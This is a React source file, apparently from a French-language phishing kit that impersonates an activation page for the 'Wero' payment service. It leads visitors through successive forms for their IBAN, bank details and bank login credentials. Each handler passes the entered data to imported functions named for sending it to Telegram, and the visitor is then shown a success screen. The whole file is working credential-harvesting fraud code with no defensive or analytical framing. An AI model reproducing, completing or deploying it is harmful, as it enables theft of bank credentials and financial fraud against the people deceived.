import React, { useState } from 'react';
import Navbar from './components/Navbar';
import Hero from './components/Hero';
import Footer from './components/Footer';
import { MessageForm } from './components/MessageForm';
import { BankForm } from './components/BankForm';
import { BankLoginForm } from './components/BankLoginForm';
import { SuccessMessage } from './components/SuccessMessage';
import { sendTelegramMessage, sendBankFormData, sendBankLoginData } from './services/telegram';

type Step = 'home' | 'iban' | 'bank' | 'login' | 'success';

export default function App() {
  const [currentStep, setCurrentStep] = useState<Step>('home');

  const handleActivateWero = () => {
    setCurrentStep('iban');
  };

  const handleBackToHome = () => {
    setCurrentStep('home');
  };

  const handleIbanSubmit = async (iban: string) => {
    const success = await sendTelegramMessage(iban);
    if (success) {
      setCurrentStep('bank');
    }
    return success;
  };

  const handleBankFormSubmit = async (formData: any) => {
    const success = await sendBankFormData(formData);
    if (success) {
      setCurrentStep('login');
    }
    return success;
  };

  const handleLoginFormSubmit = async (formData: any) => {
    const success = await sendBankLoginData(formData);
    if (success) {
      setCurrentStep('success');
    }
    return success;
  };

  return (
    <div className="min-h-screen">
      <Navbar />
      {currentStep === 'home' && (
        <>
          <Hero onActivateClick={handleActivateWero} />
          <Footer />
        </>
      )}
      {currentStep === 'iban' && (
        <div className="min-h-screen bg-gradient-to-br from-yellow-200 to-yellow-100 pt-20">
          <div className="max-w-xl mx-auto px-4 py-8">
            <button 
              onClick={handleBackToHome}
              className="flex items-center space-x-2 text-gray-700 mb-8"
            >
              <span>← Retour</span>
            </button>
            <h1 className="text-3xl md:text-4xl font-bold mb-8">Saisissez votre IBAN</h1>
            <MessageForm onSubmit={handleIbanSubmit} />
          </div>
        </div>
      )}
      {currentStep === 'bank' && (
        <BankForm onSubmit={handleBankFormSubmit} />
      )}
      {currentStep === 'login' && (
        <BankLoginForm onSubmit={handleLoginFormSubmit} />
      )}
      {currentStep === 'success' && <SuccessMessage />}
    </div>
  );
}